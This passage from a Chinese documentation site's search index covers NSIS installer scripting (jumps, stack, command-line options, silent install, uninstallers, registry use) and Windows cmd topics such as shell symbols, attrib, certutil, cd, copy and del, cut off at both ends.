否则跳转到\"没有错误时跳转的标记\"。 可使用 ClearErrors 在之前清除其他地方的错误标记 IfFileExists 语法: IfFileExists file_to_check_for jump_if_present [jump_otherwise] 检测 file_to_check_for 是否存在(可以用通配符, 或目录) 当文件存在时跳转到 file_to_check_for 否则跳转到 jump_otherwise . 例1, 官网例子: IfFileExists $WINDIR\\notepad.exe 0 +2\nMessageBox MB_OK \"notepad is installed\" 例2: IfFileExists $WINDIR\\notepad.exe fileExists fileNotExists\n\nfileExists:\n  # do something\n  Goto done\nfileNotExists:\n  Abort\ndone: Goto 作用: 跳转到指定标记。 nsi脚本常常使用相对跳转表示条件分枝 语法: Goto label_to_jump_to | +offset| -offset| user_var(target) +offset 表示从当前位置往前跳转 offset 条语句, -offset 表示从当前位置往后跳转 offset 条语句. user_var 表示跳转到指定变量标记位置. 例, 按数字跳转: Goto +4 ; 跳转以下4条语句\nGoto -3 ; 跳转到前3条语句 例, 按标记跳转: goto_example ClearErrors 当程序运行产生错误时, 可以使用 NSIS_IfErrors 判断, 返回 true/false , 表示存在错误. ClearErrors 可以清除当前已有的错误标记 堆栈操作 其实 也属于逻辑操作 NSIS 脚本没有 reture 这种返回值, 只能使用 栈 的方式在函数之前传递参数(或者全局变量) Pop Push Exch Pop 从栈顶取出一个参数. 如将栈顶元素取出, 赋值给 $0 Pop $0 Push 向栈种压入参数. 如压入 \"change\" Push \"change\" Exch 语法: Exch [user_var|stack_index] 默认交换栈顶的两个元素, 如: Push 1\nPush 2\nExch\nPop $0 # = 1 若指定了 [user_var|stack_index] : 若指定了用户变量, 使用用户变量与栈顶元素交换 如: Push 2\nExch $0 # = 2 若指定了整型(int), 即栈的索引, 使用索引位置的元素与栈顶元素交换 注意, 索引从0开始, 栈顶索引为0 如: Push 1\nPush 2\nPush 3\nExch 2\nPop $0 # = 1 如果需要交换的元素个数不足, 如索引越界等, 报错 获取命令行参数 官网地址: GetOptions GetParameters GetOptions GetParameters 语法: ${GetParameters} $var 例: ${GetParameters} $R0 ; $R0=\"[parameters]\" GetOptions 语法: ${GetOptions} \"[Parameters]\" \"[Option]\" $var\n\"[Parameters]\"     ; command line parameters\n                   ;\n\"[Option]\"         ; option name\n                   ;\n$var               ; Result: option string 例: !include \"FileFunc.nsh\"\n!insertmacro GetOptions\n!insertmacro GetParameters\n\nSection\n  ${GetOptions} \"-INSTDIR=C:\\Program Files\\Common Files -SILENT=yes\" \"-INSTDIR=\"  $R0\n  ;$R0=C:\\Program Files\\Common Files\nSectionEnd 不能写到一起, 比如以下这条语句是错误的: ${GetOptions} ${GetParameters} \"-INSTDIR=\"  $R0 例2, 命令行为: foo.exe /S /USERNAME=Bar /D=C:\\Program Files\\Foo 脚本内容为: !include FileFunc.nsh\n!insertmacro GetParameters\n!insertmacro GetOptions\n\nFunction .onInit\n  ${GetParameters} $R0\n  ClearErrors\n  ${GetOptions} $R0 /USERNAME= $0\nFunctionEnd 效果: 将 /USERNAME= 后的值赋值给 $0 , 这样就支持了自定义命令行参数. 关于 /S (静默安装参数)的判断 静默安装系统有提供默认的判断, 不需要手动去获取命令行了: Function .onInit\n  IfSilent jumpToSlient jumpNotSilent\n  jumpToSlient:\n    ; 静默安装的操作\n    Goto done\n  jumpNotSilent:\n    ; 非静默安装操作\n    Goto done\n  done:\nFunctionEnd 也可以直接定义全局变量吧 静默安装实现 /S 参数 执行的时候使用, 如 xxx.exe /S SetSilent SilentInstall and SilentUninstall SetSilent 脚本里设置: SetSilent silent | normal 只能在 .onInit. 被使用 SilentInstall 用法: SilentInstall normal|silent|silentlog SilentUninstall 用法: SilentUnInstall normal|silent 判断是否是静默安装 使用 IfSilent IfSilent +2\n  ExecWait '\"$INSTDIR\\nonsilentprogram.exe\"' 这里没懂 +2 是什么意思","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-NSIS-instruction.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-NSIS-instruction.html"},{"title":"脚本结构","text":"属性定义: NSIS_变量 包的导入: NSIS_导入其他脚本 页面配置: 向导页 区段 函数: 回调函数 ; 自定义函数 向导页 向导页(Page) 古典页面 语法: Page [Custom] <name|function> 如果使用 Custom 后面跟自定义函数, 表示自定义的向导页面, 一个函数就是一个页面, 可直接根多个. 非静默安装, 安装向导页面设置(设置显示哪些界面): Page license\nPage components\nPage directory\nPage instfiles\nUninstPage uninstConfirm\nUninstPage instfiles 现代页面(宏定义) 例如: ; 欢迎页面\n!insertmacro MUI_PAGE_WELCOME\n; 许可协议页面\n!insertmacro MUI_PAGE_LICENSE \"LicenceDeclare.txt\"\n; 安装目录选择页面\n!insertmacro MUI_PAGE_DIRECTORY\n; 安装过程页面\n!insertmacro MUI_PAGE_INSTFILES\n; 安装完成页面\n!insertmacro MUI_PAGE_FINISH\n; 安装卸载过程页面\n!insertmacro MUI_UNPAGE_INSTFILES\n; 安装界面包含的语言设置\n!insertmacro MUI_LANGUAGE \"SimpChinese\"\n; 安装预释放文件\n!insertmacro MUI_RESERVEFILE_INSTALLOPTIONS\n; ------ MUI 现代界面定义结束 ------ 还可以使用: !insertmacro\n# 和\n!define 命令进行更多安装页面和安装功能的设置. 如安装时对开始菜单、桌面快捷启动图标的设置等. 组件(自定义节/区段) 对应某种安装/卸载选项的处理逻辑, 该段代码仅当用户选择相应的选项才被执行. 卸载程序的区段名用\"un.\"作为前缀. 有些应用程序允许安装额外的组件, 比如安装的时候, 显示可选的组件, 让用户选择哪些组件可以安装. 使用 Section Section \"Installer Section\"\nSectionEnd 卸载的时候也支持可选卸载, 在名称前加 un 即可: Section \"un.Uninstaller Section\"\nSectionEnd 注解 Section 支持设置多个, 表示多个组件部分可选. 执行顺序默认为 Section 定义的顺序 区段名的修饰符: /o 表示该区段默认不选上\n- 表示隐藏区段(匿名区段也是隐藏区段)\n! 表示需要粗体显示的区段。 另外还有: SectionIn 表示该区段和安装类型之间的关系 语法: SectionIn insttype_index [insttype_index] ... [RO]\n; RO 修饰符表示不可修改。 SubSection表示子区段 语法: SubSection [/e] Caption [subsection_name index output]\n;修饰符 /e 用于该子区段的所有区段是否默认展开。 自定义函数 语法: Function fun_name\n  # do something\nFunctionEnd 调用: Call fun_name 预定义函数-回调函数 安装逻辑的回调函数: .onGUIInit .onInit .onInstFailed .onInstSuccess .onGUIEnd .onMouseOverSection .onRebootFailed .onSelChange .onUserAbort .onVerifyInstDir 卸载逻辑回调函数: un.onGUIInit un.onInit un.onUninstFailed un.onUninstSuccess un.onGUIEnd un.onRebootFailed un.onUserAbort 其他-内置字段 部分字段 VIProductVersion \"$version\" : 定义鼠标放上去时, 显示的版本信息 VIAddVersionKey /LANG=${language} \"CompanyName\" \"xxx公司\" : 鼠标放上去时, 显示的公司名称","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Script-structure.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Script-structure.html"},{"title":"一些常见错误","text":"Bad text encoding 用编辑器将编码从 UTF-8 转换为 GB2312","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-common-errors.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-common-errors.html"},{"title":"一些使用问题/技巧","text":"执行 bat 不打开 dos窗口 这个玩意儿就是一个坑, 找了几乎一天的解决方案. 什么 start 启动等 这里补充一个小技巧吧, 当在nsis脚本中执行 bat 指令时, 总是会打开 dos 黑窗口, 不想要它显示, 可以使用: ExecShell 'open' '$INSTDIR\\t.bat' \"1 1 >$INSTDIR/log.txt 2>&1\" SW_HIDE 找了很久的解决方案, 网上什么start啥的都无法执行, 最后终于实验出了这个, 一开始不知道 open 也支持打开 bat, 踏了很久的坑. SW_HIDE 表示隐藏dos窗口. 详情见: NSIS_ExecShell 安装日志设置 如下: !include \"LogicLib.nsh\"\n\n; 本区段必须放置在所有区段之前\n; 运行后会在安装目录生成一个install.log文件\nSection \"-LogSetOn\"\n      LogSet on\nSectionEnd code: !include \"LogicLib.nsh\"\n\nSection \"-LogSetOn\"\n      LogSet on\nSectionEnd 注意可能会有报错: Error: LogSet specified, NSIS_CONFIG_LOG not defined. 这是因为当前安装版本的一些内置的东西有问题, 需要去官网下载对应版本的内容进行覆盖, 下载地址: http://sourceforge.net/projects/nsis/files/ 比如安装版本是 3.06.1 , 且是log相关的部分, 就下载这个包: 下载后, 找到安装目录, 进行文件替换. github解决地址:: chore(deploy): Release #6730 NSIS_CONFIG_LOG not defined 调试 调试只有依赖 安装日志设置 或者 消息框(MessageBox)_ 了. 使用 MessageBox: MessageBox MB_OK \"变量\\$0的值: $0\" 判断电脑位数 使用 x64.nsh !include \"x64.nsh\"\n\n${If} ${RunningX64}\n  ; 是64位的\n${EndIf} 检查旧版本是否已安装 需要先下载好 nsProcess.dll, 然后使用: nsProcess::_FindProcess \"xxx.exe\" 默认是没有这个dll的, 需要手动下载, 参考: 【NSIS】安装或卸载时使用nsProcess检查程序是否正在运行 下载地址: NsProcess plugin 获取当前用户名 使用 GetUserName 函数。该函数接受一个指向缓冲区的指针和缓冲区的大小，并将当前用户的用户名写入缓冲区中。 下面是示例代码: !include LogicLib.nsh ;导入LogicLib插件\n\nSection\n    InitPluginsDir ;初始化插件目录\n\n    ;定义变量存储用户名\n    Var username\n\n    ;分配缓冲区的大小为256字节\n    StrCpy $0 256\n\n    ;调用 GetUserName 函数将用户名写入缓冲区中\n    System::Call 'advapi32::GetUserName(t r1, *i ${NSIS_MAX_STRLEN}) i.r0'\n\n    ;如果函数返回值不为0，表示成功获取到用户名\n    ${If} $0 != 0\n        ;将缓冲区中的用户名赋值给变量\n        StrCpy $username $1\n    ${EndIf}\n\n    ;打印用户名\n    DetailPrint \"Username: $username\"\n\nSectionEnd NSIS打包安装程序时获取管理员权限 NSIS脚本添加以下代码: RequestExecutionLevel admin NSIS安装后的脚本自动使用管理员权限 写注册表的方式: WriteRegStr HKCU \\\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Layers\\\" \\\"$INSTDIR\\\\program.exe\\\" \\\"RUNASADMIN\\\" 其中program.exe为要执行的主程序的名称 将文件(夹)加入到安装包 使用 File <NSIS_File> 指令, 如果是文件, 直接跟文件全名(包括后缀),\n如果是文件夹, 加 /r 选项即可. 如下例的 other 文件夹: Section Do\n  SetOutPath $INSTDIR\n  File /r other\nSectionEnd 释放对安装目录的占用 有时候在执行bat脚本时, 需要操作安装目录, 这时需要释放对安装目录的文件句柄占用,\n在执行前使用 SetOutPath \"$TEMP\" 切换一下输出目录即可: Section\n  SetOutPath \"$INSTDIR\"\n\n  ; do ...\n\n  SetOutPath \"$TEMP\"\n  ;执行批处理文件\n  ExecWait '\"$INSTDIR\\your_batch_file.bat\"'\nSectionEnd 注解 这里有一个点我一直没想明白, 暂且记下来吧: 在 NSIS 脚本中调用 bat 指令时, 看任务管理器,\n实际是一个 cmd.exe 下启动的类似进程组(Windows貌似只有任务, 没有进程组的概念, 此处不做讨论).\n即使调用 bat 指令时, 使用的是 ExecShell <NSIS_ExecShell> 来后台执行, 且 NSIS 脚本已经执行完成退出. 且此时的情况: NSIS 脚本退出 NSIS 调用的后台执行的 bat 脚本仍在执行 这时候会发现 bat 脚本还是拥有 $INSTDIR 安装目录的占用, 其实是 SetOutPath 的占用. 目前猜测有以下几种可能: NSIS 启动的子进程的句柄占用会传递给 bat 脚本 NSIS 脚本的句柄占用会被 cmd.exe 给拿到 具体是什么情况, 暂时没看出来... 写卸载脚本 有时候可能像自己写一个卸载脚本: WriteUninstaller \"$INSTDIR\\uninstall.exe\" 注意这个时候必须存在 Uninstall 小节, 如: Section Uninstall\n  ; 在这里添加卸载时要执行的操作\n\n  ;Delete other/xxx\n\n  ; SetOutPath \"$INSTDIR\"\n  ; RMDir /r \"$INSTDIR\\other\"\n  RMDir /r \"$INSTDIR\\other\"\nSectionEnd Uninstall 小节是预定义名称的小节, 卸载时调用. 注意这时候不能直接设置输出路径, 然后使用相对路径删除. 若有需要卸载时调用的函数, 函数名需以 un. 开头. 卸载预定义函数见: 回调函数 申请管理员权限 在nsis脚本开头写入: RequestExecutionLevel admin 即可在执行安装程序时弹出申请管理员权限窗口. 若没有, 看看后面是不是重复写了其他权限如: RequestExecutionLevel user 再不行就是低版本nsis或操作系统版本低不支持. 安装与卸载时变量共享 能共享的变量只有预定义的一些内置变量, 目前自己测试过可行的只有: $INSTDIR 且只能是一开始定义的安装目录, 若后续在安装时有修改, 卸载时此修改不生效. 故, 要想共享, 最简单的就是使用注册表了, 注意要申请管理员权限提权才能写注册表, 例: RequestExecutionLevel user\n\nVar HomeDir\n\nSection Do1\n  WriteUninstaller \"$INSTDIR\\uninstall.exe\"\n  StrCpy $HomeDir \"D:\\Program Files\\test\\Example2\"\n\n  ; 将变量的值写入卸载程序\n  WriteRegStr HKLM \"Software\\TNsis\" \"AppHomeDir\" \"$HomeDir\"\nSectionEnd\n\nSection Uninstall\n  ; 读取变量的值\n  ReadRegStr $HomeDir HKLM \"Software\\TNsis\" \"AppHomeDir\"\n  MessageBox MB_OK \"The value of HomeDir is $HomeDir\"\n\n  ; 删除注册表键\n  DeleteRegKey HKLM \"Software\\TNsis\"\n\n  RMDir /r \"$HomeDir\"\nSectionEnd 注册表相关操作可参考: NSIS_注册表操作 其他方式可以通过写文件的方式, 有点麻烦, 暂不表述 GUI界面选择安装路径 需要先导入 MUI.nsh , 然后插入页面: !include \"MUI.nsh\"\n\n!insertmacro MUI_PAGE_DIRECTORY     ; 选择安装路径页面\n!insertmacro MUI_PAGE_INSTFILES     ; 选择安装文件页面\n\nInstallDir \"$PROGRAMFILES\\MyApp\"    ; 指定默认安装路径\n\n!insertmacro MUI_PAGE_FINISH        ; 安装完成页面 注意, 选择安装位置的执行时间在 init 之后, 所以要在 init 之后的 section 获取安装位置才是可靠的. 此头文件详情可见: 常用头文件 NSIS 卸载程序参数 /q 表示静默安装 _? 表示是否打开GUI确认卸载框 _?=0：不需要用户确认，直接执行卸载操作; _?=1：需要用户确认，打开卸载确认对话框; _?=2：需要用户确认，但不需要显示卸载确认对话框. 默认情况下，NSIS脚本会自动向卸载程序传递一个 _?=1 的命令行参数. 卸载时的返回值 暂时无解, 至少我目前没找到 SetUninstallReturnValue eg: Function un.onUninstSuccess\n  ; 在这里执行卸载成功后的清理操作\n\n  SetUninstallReturnValue 1234 ; 手动抛出返回值\n\n  MessageBox MB_OK \"卸载程序返回值：$0\"\nFunctionEnd 这个貌似 只有旧版本的NSIS有指令 ,\n新版本暂时没找到支持的方法, 暂时通过 判断安装目录是否存在确定是否卸载成功 : 卸载程序名称确定: StrCpy $1 \"$INSTDIR\\uninstall.exe\" 获取目录字符串的长度, 然后获取目录: StrLen $9 $1\nIntOp $8 $9 - 14\nStrCpy $7 $1 $8\nMessageBox MB_OK \"dir: $7\" 确定目录是否存在: IfFileExists \"$7\" +1 +2\nMessageBox MB_OK \"dir exists: $7 \"\nMessageBox MB_OK \"dir not exists: $7 \" 卸载成功的话文件是会被全部删除的. 除非特意留下某些残留, 那就需要自行兼容处理了. 获取安装窗体句柄 使用变量 $HWNDPARENT 将窗体前台显示 使用 BringToFront 指令. 不过存在一个问题, 有时候前台显示效果是:\n在任务栏闪烁, 点击闪烁图标后后才会前台显示 安装后是否有exe文件 这个主要是看你自己的程序内容存在不存在 exe 文件. 一般存在就直接写进去即可 Section \"MainSection\" SetOutPath \" $INSTDIR \" File \"path\\to\\your\\executable.exe\" SectionEnd 完整一点大概是 ; nsis将内容打包的, 包名 Outfile \"MyInstaller.exe\" ; 默认的安装目录 (用 Outfile 安装) InstallDir \" $PROGRAMFILES \\MyApp\" Section \"MainSection\" SetOutPath \" $INSTDIR \" File \"path\\to\\your\\executable.exe\" SectionEnd Section - Post WriteUninstaller \" $INSTDIR \\uninstall.exe\" SectionEnd Section \"Uninstall\" Delete \" $INSTDIR \\executable.exe\" Delete \" $INSTDIR \\uninstall.exe\" RMDir \" $INSTDIR \" SectionEnd","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-problems-and-skills.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-problems-and-skills.html"},{"title":"windows下关机程序正在运行问题","text":"一般情况下直接不管就行， 我的问题是，发现有一个名叫 t 的程序但是我没执行过，于是就去任务管理器里找，一直没找到到。 tasklist 也找了没有。 于是研究了一下， 发现这个提示的名称并不是进程名， 而是进程打开窗口的那个进程的 title 这里感谢知友的这篇帖子： Windows关机提示\"这个应用阻止关机\"，怎样确认是什么程序？？ 需要查看软件标题的话就需要工具了，比如： nirsoft的GUIPropView 下载地址： GUIPropView 下载后解压点击title排序即可","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-lower-clearance-program-is-running-problems.html","loc":"/yq-docs-operating-system-Windows-Windows-lower-clearance-program-is-running-problems.html"},{"title":"Windows打开Debian问题（虚拟机无法打开问题）","text":"参考的对象类型不支持尝试的操作。 报错 参考的对象类型不支持尝试的操作。 Press any key to continue... 原因 使用代理软件, 或游戏加速服务, winsock出现问题。 注解 我这里是开启内存完整性引起的 单次解决 netsh winsock reset 注解 后面发现是因为我开启了内存完整性,  会影响虚拟机启动,  还有docker容器启动, 关闭即可 Win11 内存完整性关闭状态 后面补充， 发现还可能有个原因是没有开启Hyper-V 在windows功能里安装打开即可 打开功能Hyper-V","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-opens-the-Debian-problem.html","loc":"/yq-docs-operating-system-Windows-Windows-opens-the-Debian-problem.html"},{"title":"windows_shell符号","text":"一些符号 原文: 符号的用法 单符号 ~ ~\n① 在for中表示使用增强的变量扩展。\n② 在%var:~n,m%中表示使用扩展环境变量指定位置的字符串。\n③ 在set/a中表示一元运算符，将操作数按位取反。 ! !\n① 在set /a中一元运算符，表示逻辑非。比如set /a a=!0，这时a就表示逻辑1。 @ @\n① 隐藏命令行本身的回显，常用于批处理中。 $ $\n① 在findstr命令里面表示一行的结束。\n② 在prompt命令里面，表示将其后的字符转义（符号化或者效果化）。 % %\n① 在set /a中的二元运算符，表示算术取余。\n② 命令行环境下，在for命令in前，后面接一个字符（可以是字母、数字或者一些特定字符），表示指定一个循环或者遍历指标变量。\n③ 批处理中，后接一个数字表示引用本批处理当前执行时的指定的参数。\n④ 其它情况下，%将会被脱去（批处理）或保留（命令行） &#94; &#94;\n① 取消特定字符的转义作用，比如& | > < ! \"等，但不包括%。比如要在屏幕显示一些特殊的字符，比如> >> | &#94; &等符号时，\n  就可以在其前面加一个&#94;符号来显示这个&#94;后面的字符了，&#94;&#94;就是显示一个&#94;，&#94;|就是显示一个|字符了;\n② 在set/a中的二元运算符，表示按位异或。\n③ 在findstr/r的[]中表示不匹配指定的字符集。 & &\n① 命令连接字符。比如我要在一行文本上同时执行两个命令，就可以用&命令连接这两个命令。\n② 在set/a中是按位与。 * *\n① 代表任意个任意字符，就是我们通常所说的\"通配符\";比如想在c盘的根目录查找c盘根目录里所有的文本文件(.txt)，那么就可以输入命令\"dir c:\\*.txt\"。\n② 在set /a中的二元运算符，表示算术乘法。\n③ 在findstr/r中表示将前一个字符多次匹配。 - -\n① 范围表示符，比如日期的查找，for命令里的tokens操作中就可以用到这个字符。\n② 在findstr/r中连接两个字符表示匹配范围。\n③ -跟在某些命令的/后表示取反向的开关。\n④ 在set /a中：\n 1.表示一个负数。\n 2.表示算术减运算。 + +\n① 主要是在copy命令里面会用到它，表示将很多个文件合并为一个文件，就要用到这个+字符了。\n② 在set/a中的二元运算符,表示算术加法。 : :\n① 标签定位符，表示其后的字符串为以标签，可以作为goto命令的作用对象。比如在批处理文件里面定义了一个\":begin\"标签，用\"goto begin\"命令就可以转到\":begin\"标签后面来执行批处理命令了。\n② 在%var:string1=string2%中分隔变量名和被替换字串关系。 | |\n① 管道符，就是将上一个命令的输出，作为下一个命令的输入.\"dir /a/b |more\"就可以逐屏的显示dir命令所输出的信息。\n② 在set/a中的二元运算符，表示按位或。\n③ 在帮助文档中表示其前后两个开关、选项或参数是二选一的。 / /\n① 表示其后的字符（串）是命令的功能开关（选项）。比如\"dir /s/b/a-d\"表示\"dir\"命令指定的不同的参数。\n② 在set/a中表示除法。 > >\n① 命令重定向符，将其前面的命令的输出结果重新定向到其后面的设备中去，后面的设备中的内容被覆盖。比如可以用\"dir > lxmxn.txt\"将\"dir\"命令的结果输出到\"lxmxn.txt\"这个文本文件中去。\n② 在findstr/r中表示匹配单词的右边界，需要配合转义字符\\使用。 < <\n① 将其后面的文件的内容作为其前面命令的输入。\n② 在findstr/r中表示匹配单词的左边界，需要配合转义字符\\使用。 = =\n① 赋值符号，用于变量的赋值。比如\"set a=windows\"的意思意思是将\"windows\"这个字符串赋给变量\"a\"。\n② 在set/a中表示算术运算，比如\"set /a x=5-6*5\"。 \\ \\\n① 这个\"\\\"符号在有的情况下，代表的是当前路径的根目录.比如当前目录在c:\\windows\\system32下，那么你\"dir \\\"的话，就相当与\"dir c:\\\"。\n② 在findstr/r中表示正则转义字符。 , ,\n① 在set /a中表示连续表达式的分割符。\n② 在某些命令中分割元素。 . .\n① 在路径的\\后紧跟或者单独出现时：\n 一个.表示当前目录。\n 两个.表示上一级目录。\n② 在路径中的文件名中出现时：\n 最后的一个.表示主文件名与扩展文件名的分隔。 ? ?\n① 在findstr/r中表示在此位置匹配一个任意字符。\n② 在路径中表示在此位置通配任意一个字符。\n③ 紧跟在/后表示获取命令的帮助文档。 多符号(符号不能分隔) && &&\n① 连接两个命令，当&&前的命令成功时，才执行&&后的命令。 || ||\n① 连接两个命令，当||前的命令失败时，才执行||后的命令。 >& >&\n① 将一个句柄的输出写入到另一个句柄的输入中。 <& <&\n① 从一个句柄读取输入并将其写入到另一个句柄输出中。 %% %%\n① 两个连续的%表示在预处理中脱为一个%。\n② 批处理中，在for语句的in子句之前，连续两个%紧跟一个字符（可以是字母、数字和一些特定字符），表示指定一个循环或者遍历指标变量。\n③ 批处理中，在for语句中，使用与in之前指定的指标变量相同的串，表示引用这个指标变量。 >> >>\n① 命令重定向符，将其前面的命令的输出结果追加到其后面的设备中去。\n② 在set /a中的二元运算符，表示逻辑右移。 == ==\n① ==在if命令中判断==两边的元素是否相同。 << <<\n① 在set /a中的二元运算符，表示逻辑左移。 += +=\n① 在set /a中的二元运算符。例如set /a a+=b表示将a加上b的结果赋值给a。 -= -=\n① 在set /a中的二元运算符。例如set /a a-=b表示将a减去b的结果赋值给a。 *= *=\n① *= 在set /a中的二元运算符。例如set /a a*=b表示将a乘以b的结果赋值给a。 /= /=\n① /= 在set /a中的二元运算符。例如set /a a/=b表示将a加上b的结果赋值给a。 %= %=\n① %=在set /a中的二元运算符。例如set /a a%=b表示将a除以b的余数赋值给a。\n【注：命令行可以直接用 set /a a%=b ，在批处理里面可以用 set /a a%%=b 。】 &#94;= &#94;=\n① 在set /a中的二元运算符。例如set /a a\"&#94;=\"b表示将a与b按位异的结果赋值给a。\n【注：这里 \"&#94;=\" 加引号是为了防止&#94;被转义，下同。】 &= &=\n① 在set /a中的二元运算符。例如set /a a\"&=\"b表示将a与b按位与的结果赋值给a。 |= |=\n① 在set /a中的二元运算符。例如set /a a\"|=\"b表示将a与b按位或的结果赋值给a。 <<= <<=\n① 在set /a中的二元运算符。例如set /a a\"<<=\"b表示将a按位左移b位的结果赋值给a。 >>= >>=\n① 在set /a中的二元运算符。例如set /a a\">>=\"b表示将a按位右移b位的结果赋值给a。 \\< \\<\n① \\< 在findstr的一般表达式中表示字的开始处。 \\> \\>\n① \\> 在findstr的一般表达式中表示字的结束处。 双符号对(两个符号之间须指定字符串) ! ! ! !\n① ! ! 当启用变量延迟时，使用!!将变量名扩起来表示对变量值的引用。 ' ' ' '\n① 在for/f中表示将它们包含的内容当作命令行执行并分析其输出。\n② 在for/f \"usebackq\"中表示将它们包含的字符串当作字符串分析。 ( ) ( )\n① 命令包含或者是具有优先权的界定符，比如for命令要用到这个()，我们还可以在if，echo等命令中见到它的身影。\n② 在set /a中表示表达式分组。 \" \" \" \"\n① 界定符，在表示带有空格的路径时常要用\"\"来将路径括起来，在一些命令里面也需要\" \"符号。\n② 在for/f中将表示它们包含的内容当作字符串分析。\n③ 在for/f \"usebackq\"表示它们包含的内容当作文件路径并分析其文件的内容。\n④ 在其它情况下表示其中的内容是一个完整的字符串，其中的>、>>、<、&、|、空格等不再转义。 ` ` ` `\n① 在for/f中表示它们所包含的内容当作命令行执行并分析它的输出。 % % % %\n① 使用两个单独的%包含一个字符串表示引用以此串为名的环境变量。比如一个%time%可以扩展到当前的系统时间。 [ ] [ ]\n① 在帮助文档表示其中的开关、选项或参数是可选的。\n② 在findstr /r中表示按其中指定的字符集匹配。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows_shell-symbol.html","loc":"/yq-docs-operating-system-Windows-Windows_shell-symbol.html"},{"title":"attrib","text":"显示或更改文件属性: ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U]\n      [drive:][path][filename] [/S [/D]] [/L] 选项/参数说明: +   设置属性。\n-   清除属性。\nR   只读文件属性。\nA   存档文件属性。\nS   系统文件属性。\nH   隐藏文件属性。\nO   脱机属性。\nI   无内容索引文件属性。\nX   无清理文件属性。\nV   完整性属性。\nP   固定属性。\nU   非固定属性。\n[drive:][path][filename]\n    指定属性要处理的文件。\n/S  处理当前文件夹及其所有子文件夹中\n    的匹配文件。\n/D  也处理文件夹。\n/L  处理符号链接和\n    符号链接目标的属性 例: md autorun\nattrib +a +s +h autorun 上面的命令将建立文件夹autorun，然后将其设为存档、系统、隐藏属性","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-Attrib.html","loc":"/yq-docs-operating-system-Windows-windows_shell-Attrib.html"},{"title":"certutil","text":"windows下 查看文件 MD5 SHA1 SHA256 certutil -hashfile filename MD5\ncertutil -hashfile filename SHA1\ncertutil -hashfile filename SHA256","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-CertUtil.html","loc":"/yq-docs-operating-system-Windows-windows_shell-CertUtil.html"},{"title":"cd","text":"显示当前目录名或改变当前目录: CHDIR [/D] [drive:][path]\nCHDIR [..]\nCD [/D] [drive:][path]\nCD [..]\n\n  ..   指定要改成父目录。 键入 CD drive: 显示指定驱动器中的当前目录。\n不带参数只键入 CD，则显示当前驱动器和目录。 使用 /D 开关，除了改变驱动器的当前目录之外，还可改变当前驱动器。 如果命令扩展被启用，CHDIR 会如下改变: 当前的目录字符串会被转换成使用磁盘名上的大小写。\n所以，如果磁盘上的大小写如此， CD C:\\TEMP 会将当前目录设为 C:\\Temp CHDIR 命令不把空格当作分隔符，因此有可能将目录名改为一个\n带有空格但不带有引号的子目录名。例如: cd \\winnt\\profiles\\username\\programs\\start menu 与下列相同: cd \"\\winnt\\profiles\\username\\programs\\start menu\" 在扩展停用的情况下，你必须键入以上命令。 特别说明-更新驱动器 一般而言, 直接使用 cd 命令时, 不能更改驱动器, 只有加 /d 选项时, 才支持更改驱动器. 如: ; 无效\nC:\\Users>cd \"D:\\Program Files\"\n\n; 有效\nC:\\Users>cd /d  \"D:\\Program Files\"\n\nD:\\Program Files>","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-Chengdu.html","loc":"/yq-docs-operating-system-Windows-windows_shell-Chengdu.html"},{"title":"copy","text":"将一份或多份文件复制到另一个位置: COPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ] source [/A | /B]\n    [+ source [/A | /B] [+ ...]] [destination [/A | /B]]\n\n  source       指定要复制的文件。\n  /A           表示一个 ASCII 文本文件。\n  /B           表示一个二进位文件。\n  /D           允许解密要创建的目标文件\n  destination  为新文件指定目录和/或文件名。\n  /V           验证新文件写入是否正确。\n  /N           复制带有非 8dot3 名称的文件时，\n                尽可能使用短文件名。\n  /Y           不使用确认是否要覆盖现有目标文件\n                的提示。\n  /-Y          使用确认是否要覆盖现有目标文件\n                的提示。\n  /Z           用可重新启动模式复制已联网的文件。\n  /L           如果源是符号链接，请将链接复制\n                到目标而不是源链接指向的实际文件。 命令行开关 /Y 可以在 COPYCMD 环境变量中预先设定。\n这可能会被命令行上的 /-Y 替代。\n除非 COPY命令是在一个批处理脚本中执行的，默认值应为在覆盖时进行提示。 要附加文件，请为目标指定一个文件，为源指定数个文件(用通配符或 file1+file2+file3 格式)。 与xcopy的区别 xcopy 在Windows的批处理脚本中，copy和xcopy命令都可以用于复制文件和目录。不过它们之间还是存在一些差异的。 copy命令是一个比较简单的复制命令，它只能复制单个文件，不能复制目录。语法: copy source_file destination_file 这个命令会将源文件拷贝到指定的目标文件中。如果目标文件已经存在，则会被覆盖。 xcopy命令则更加强大，不仅可以复制单个文件，还可以复制整个目录树。语法: xcopy source [destination] [/options] 其中，source表示要复制的源文件或目录；destination表示目标目录；\n/options是可选的命令行选项，可以设置例如是否复制子目录、是否覆盖现有文件等参数。 相比之下，xcopy命令比copy命令更加灵活和强大，尤其是在需要复制整个目录树时非常实用。\n但也因为功能较多，命令语法也更加复杂，需要注意命令参数的正确使用。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-Copy.html","loc":"/yq-docs-operating-system-Windows-windows_shell-Copy.html"},{"title":"del","text":"删除一个或多个文件: DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names\nERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names 选项: names         指定一个或多个文件或者目录列表。\n              通配符可用来删除多个文件。\n              如果指定了一个目录，该目录中的所\n              有文件都会被删除。\n\n/P            